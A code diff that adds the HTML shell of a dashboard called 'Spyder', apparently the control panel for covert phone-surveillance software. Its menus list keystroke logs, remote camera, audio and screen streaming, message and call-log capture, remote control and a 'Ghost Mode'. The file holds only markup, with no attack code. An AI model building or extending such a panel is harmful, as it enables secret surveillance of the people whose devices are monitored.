@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>• Spyder</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<link rel="apple-touch-icon" href="/icons/spider-192.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="stylesheet" href="./css/dashboard/dashboard.css">
+
+</head>
+<body>
+
+<!-- Loading Spinner -->
+<div id="loadingSpinner" class="loader-container">
+  <div class="loader-content">
+    <div class="loader-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+    <div class="loader-status">
+      <span class="status-text">Fetching devices</span>
+    </div>
+  </div>
+</div>
+
+<!-- Navbar -->
+<nav class="navbar">
+  <div class="logo">
+    <button title="Toggle Sidebar" id="navbar-toggle">
+      <i id="hamburger" class="fas fa-bars"></i>
+    </button>
+    <div onclick="loadPage('home')"><i class="fas fa-bug"></i>Spyder</div>
+  </div>
+  <div class="nav-btn">
+    <button style="cursor:not-allowed;" disabled title="Premium" class="upgrade-btn">
+      <i class="fa-solid fa-shield-halved"></i>
+    </button>
+    <button title="Notifications" class="notify-btn">
+      <i class="fa-solid fa-bell"></i>
+    </button>
+    <button title="My Account" onclick="loadPage('setting')" id="setting" class="setting-btn">
+      <i class="fa-solid fa-user-gear"></i>
+    </button>
+    <button title="Logout" onclick="logout()" class="logout-btn">
+      <i class="fa-solid fa-arrow-right-from-bracket"></i>
+    </button>
+  </div>
+</nav>
+
+<section class="flex-container">
+  <!-- Sidebar -->
+  <div class="sidebar" id="sidebar">
+  
+    <div class="sidebar-toggle-box">
+      <button title="Collapse Sidebar" id="sidebar-toggle">
+        <i class="fas fa-bars"></i>
+    </button>
+    </div>
+
+    <!-- <ul id="sidebar-menu">
+      
+      <li data-page="home" onclick="loadPage('home')" class="marginSideInput">
+        <i class="fas fa-home"></i><span>Dashboard</span>
+      </li>
+      <li data-page="sms" onclick="loadPage('sms')">
+        <i class="fas fa-sms"></i><span>Messages</span>
+      </li>
+        <li data-page="calls" onclick="loadPage('calls')">
+        <i class="fas fa-phone-alt"></i><span>Call Logs</span>
+      </li>
+       <li data-page="contacts" onclick="loadPage('contacts')">
+        <i class="fas fa-address-book"></i><span>Contacts</span>
+      </li>
+      <li data-page="locations" onclick="loadPage('locations')">
+        <i class="fas fa-map-marker-alt"></i><span>Location</span>
+      </li>
+            <li data-page="siteweb" onclick="loadPage('siteweb')">
+        <i class="fas fa-globe"></i><span>Web Activity</span>
+      </li>
+            <li data-page="gallery" onclick="loadPage('gallery')">
+        <i class="fas fa-images"></i><span>Media Gallery</span>
+      </li>
+            <li data-page="keylogger" onclick="loadPage('keylogger')">
+        <i class="fas fa-keyboard"></i><span>Keystroke Logs</span>
+      </li>
+      <li data-page="remotecontrol" onclick="loadPage('remotecontrol')">
+        <i class="fas fa-cubes"></i><span>Remote Control</span>
+      </li>
+        <li data-page="apps" onclick="loadPage('apps')">
+        <i class="fas fa-th-large"></i><span>App Blocker</span>
+      </li>
+      <li data-page="social-media" onclick="loadPage('social-media')">
+        <i class="fas fa-th-large"></i><span>Social Media</span>
+      </li>
+       <li data-page="Ghost Mode" onclick="loadPage('ghost')">
+        <i class="fas fa-user-secret"></i><span>Ghost Mode</span>
+      </li>
+       <li data-page="wallpaper" onclick="loadPage('wallpaper')">
+        <i class="fas fa-image"></i><span>Wallpaper Control</span>
+      </li>
+      <li data-page="camera" onclick="loadPage('camera')">
+        <i class="fas fa-camera"></i><span>Camera</span>
+      </li>
+      <li data-page="Audio Stream" onclick="loadPage('audio-stream')">
+        <i class="fas fa-user-secret"></i><span>Audio Stream</span>
+      </li>
+       <li data-page="Screen-Stream" onclick="loadPage('screen-stream')">
+        <i class="fas fa-desktop"></i><span>Screen Stream</span>
+      </li>
+      <li data-page="access-Stream" onclick="loadPage('access')">
+        <i class="fas fa-desktop"></i><span>Access</span>
+      </li>
+      <li data-page="access-Stream" onclick="loadPage('player')">
+        <i class="fas fa-desktop"></i><span>player</span>
+      </li>
+      <li data-page="data" onclick="loadPage('data')">
+        <i class="fas fa-folder-open"></i><span>Screen Data Recorder</span>
+      </li>
+       <li data-page="filemanager" onclick="loadPage('filemanager')">
+        <i class="fas fa-folder-open"></i><span>File Manager</span>
+      </li>
+        <li data-page="statistics" onclick="loadPage('statistics')">
+        <i class="fas fa-chart-pie"></i><span>Analytics</span>
+      </li>
+      
+     
+    </ul> -->
+
+    <ul id="sidebar-menu">
+
+  <li data-page="dashboard" onclick="loadPage('home')" class="marginSideInput">
+    <i class="fas fa-home"></i>
+    <span>Dashboard</span>
+  </li>
+
+  <li data-page="messages" onclick="loadPage('sms')">
+    <i class="fas fa-sms"></i>
+    <span>Messages</span>
+  </li>
+
+  <li data-page="call-logs" onclick="loadPage('calls')">
+    <i class="fas fa-phone-alt"></i>
+    <span>Call Logs</span>
+  </li>
+
+  <li data-page="contacts" onclick="loadPage('contacts')">
+    <i class="fas fa-address-book"></i>
+    <span>Contacts</span>
+  </li>
+
+  <li data-page="location" onclick="loadPage('locations')">
+    <i class="fas fa-map-marker-alt"></i>
+    <span>Location</span>
+  </li>
+
+  <li data-page="web-activity" onclick="loadPage('siteweb')">
+    <i class="fas fa-globe"></i>
+    <span>Web Activity</span>
+  </li>
+
+  <li data-page="social-media" onclick="loadPage('social-media')">
+    <i class="fas fa-users"></i>
+    <span>Social Media</span>
+  </li>
+
+  <li data-page="media-gallery" onclick="loadPage('gallery')">
+    <i class="fas fa-images"></i>
+    <span>Media Gallery</span>
+  </li>
+
+  <li data-page="camera" onclick="loadPage('camera')">
+    <i class="fas fa-camera"></i>
+    <span>Camera</span>
+  </li>
+
+  <li data-page="screen-stream" onclick="loadPage('screen-stream')">
+    <i class="fas fa-desktop"></i>
+    <span>Screen Stream</span>
+  </li>
+
+  <li data-page="audio-stream" onclick="loadPage('audio-stream')">
+    <i class="fas fa-volume-up"></i>
+    <span>Audio Stream</span>
+  </li>
+
+
+
+  <li data-page="app-blocker" onclick="loadPage('apps')">
+    <i class="fas fa-th-large"></i>
+    <span>App Blocker</span>
+  </li>
+
+  <li data-page="keystroke-logs" onclick="loadPage('keylogger')">
+    <i class="fas fa-keyboard"></i>
+    <span>Keystroke Logs</span>
+  </li>
+
+  <li data-page="file-manager" onclick="loadPage('filemanager')">
+    <i class="fas fa-folder-open"></i>
+    <span>File Manager</span>
+  </li>
+
+  <li data-page="screen-recorder" onclick="loadPage('data')">
+    <i class="fas fa-search-plus"></i> 
+    <span>Forensic Scan</span>
+  </li>
+    <li data-page="remote-control" onclick="loadPage('remotecontrol')">
+    <i class="fas fa-gamepad"></i>
+    <span>Remote Control</span>
+  </li>
+
+  <li data-page="access-control" onclick="loadPage('live-control')">
+    <i class="fas fa-user-shield"></i>
+    <span>Live Access</span>
+  </li>
+
+  <li data-page="wallpaper-control" onclick="loadPage('wallpaper')">
+    <i class="fas fa-image"></i>
+    <span>Wallpaper</span>
+  </li>
+
+  <li data-page="ghost-mode" onclick="loadPage('ghost')">
+    <i class="fas fa-user-secret"></i>
+    <span>Ghost Mode</span>
+  </li>
+
+  <li data-page="analytics" onclick="loadPage('statistics')">
+    <i class="fas fa-chart-pie"></i>
+    <span>Analytics</span>
+  </li>
+
+</ul>
+  </div>
+
+  <!-- Flyout label -->
+  <div class="flyout-label" id="flyout-label"></div>
+
+  <!-- Main content -->
+  <div id="mainContent" class="content main-container"></div>
+
+  <!-- NOTIFICATION PANEL -->
+  <div class="notification-top" id="notificationPanel">
+    <div class="notification-top-2">
+      <div class="main-notification">
+        <div id="dashboardHeader">
+          <h2><i class="fa-solid fa-bell"></i> Notifications</h2>
+          <div class="notif-header-right">
+            <span class="notif-count-badge" id="notifBadge" style="display:none">0</span>
+            <button id="clearAllBtn">Clear all</button>
+          </div>
+        </div>
+        <div id="notifications"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Popup Toast -->
+  <div id="popupNotification">
+    <div class="popup-header">
+      <img id="popupIcon" src="/placeholder.svg" alt="icon">
+      <span class="popup-app-name"></span>
+      <button class="popup-close">&times;</button>
+    </div>
+    <div class="popup-message"></div>
+    <div class="popup-time"></div>
+  </div>
+
+  <!-- Modal -->
+  <div id="modalNotification">
+    <div id="modalContent">
+      <img id="modalIcon" src="/placeholder.svg" alt="icon">
+      <div class="modal-title"></div>
+      <div class="modal-text"></div>
+      <div class="modal-time"></div>
+      <button class="modal-close">Close</button>
+    </div>
+  </div>
+</section>
+
+<script type="module" src="./js/auth/auth.js"></script>
+<script src="./js/router/router.js"></script>
+<script type="module" src="./js/dashboard/dashboard.js"></script>
+
+</body>
+</html>
